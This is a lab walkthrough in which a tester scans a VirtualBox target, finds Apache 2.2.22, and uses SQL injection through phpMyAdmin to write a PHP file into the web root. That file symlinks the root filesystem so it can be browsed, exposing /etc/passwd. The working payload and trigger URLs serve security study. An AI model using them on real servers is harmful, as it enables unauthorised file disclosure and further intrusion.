# Apache 2.2.22 Local File Disclosure via Symbolic Link

Using `nmap`, we discovered that the target machine is running an outdated version of Apache:

```bash
┌──(jdamoise㉿kali)-[~]
└─$ nmap -sV 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 10:35 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00057s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:6D:D3:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Apache version 2.2.22 is known to have vulnerabilities, particularly in how it handles symbolic links under certain configurations. If the web server is configured to allow PHP file uploads and the `open_basedir` restriction is not in place, it becomes possible to create a symbolic link pointing to the root directory `/` — thereby exposing the entire filesystem via the web browser.

### Exploitation via phpMyAdmin SQL Injection

In this case, we leverage SQL injection through phpMyAdmin to create a malicious PHP file that creates the symbolic link. The SQL payload is as follows:

```sql
SELECT 1, '<?php symlink("/", "paths.php"); ?>' INTO OUTFILE '/var/www/forum/templates_c/run.php';
```

This command writes a PHP file (`run.php`) into the web-accessible `templates_c` directory. When this script is executed, it will create a symbolic link named `paths.php` pointing to the root directory `/`.

### Gaining Access to the Root Filesystem

Once the symlink is in place, we trigger the script by visiting the following URL in the browser:

```
http://192.168.56.101/forum/templates_c/run.php
```

After the symbolic link is created, we can browse the contents of the root filesystem simply by accessing:

```
http://192.168.56.101/forum/templates_c/paths.php
```

This effectively allows us to navigate the entire server file system from the web browser, exposing sensitive files such as `/etc/passwd`, `/var/www`, and more — potentially leading to privilege escalation or further exploitation.